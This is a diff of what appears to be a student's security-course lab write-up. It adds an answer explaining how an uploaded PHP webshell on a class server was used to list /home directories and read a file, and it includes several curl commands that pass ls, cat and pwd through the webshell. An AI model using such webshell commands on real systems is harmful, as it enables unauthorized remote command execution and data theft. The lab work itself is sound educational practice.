@@ -216,7 +216,25 @@ rather than have all the text in one continuous line.
 
 
 Part 2
-a. 
+a. The website is being stored within a directory called jeff. In order to find the 
+directory, I made use of the command ls%20-a%20/home to show me some of the first few directories that 
+were available to me, this is where I found jeff. I then made use of the command 
+ls%20-a%20/home/jeff to see what was within this directory and found the uploadedimages. 
+By finding uploadedimages I can confirm that /home/jeff was where the website was being 
+saved at.
+
+curl 'http://danger.jeffondich.com/uploadedimages/moranl2-webshell.php?command=ls%20-a'
+
+curl 'http://danger.jeffondich.com/uploadedimages/moranl2-webshell.php?command=ls%20-a%20/home'
+
+curl 'http://danger.jeffondich.com/uploadedimages/moranl2-webshell.php?command=ls%20-a%20/home/jeff'
+
+curl 'http://danger.jeffondich.com/uploadedimages/moranl2-webshell.php?command=/home/jeff%20cat%20youfoundme.txt'
+
+ curl 'http://danger.jeffondich.com/uploadedimages/moranl2-webshell.php?command=cat%20/home/jeff/youfoundme.txt'
+
+curl 'http://danger.jeffondich.com/uploadedimages/moranl2-webshell.php?command=pwd'
+
 
 b. 
 
@@ -225,9 +243,6 @@ c.
 d. 
 
 e. 
-
-[Stop here]
-f. 
 
 
 Part 4
